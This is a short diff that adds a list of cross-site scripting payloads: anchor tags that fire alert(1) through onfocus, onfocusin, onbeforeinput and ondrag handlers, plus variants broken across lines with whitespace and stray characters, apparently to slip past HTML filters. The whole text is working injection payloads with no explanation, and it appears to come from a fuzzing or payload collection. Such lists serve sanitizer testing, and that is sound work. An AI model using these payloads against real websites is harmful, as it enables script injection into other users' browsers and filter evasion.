@@ -1,0 +1,32 @@
+<a autofocus onfocus=alert(1) href></a>
+<a autofocus onfocusin=alert(1) href></a>
+<a contenteditable onbeforeinput=alert(1)>test
+<a draggable="true" ondrag="alert(1)" style=display:block>test</a>
+
+
+
+
+
+<a
+ 
+ autofocus
+ 
+ onfocus=alert(1) href>
+<
+/
+a>
+0x
+
+
+
+
+<a
+_
+autofocus 
+_
+onfocus
+=
+alert
+(1) 
+href>
+</a> <
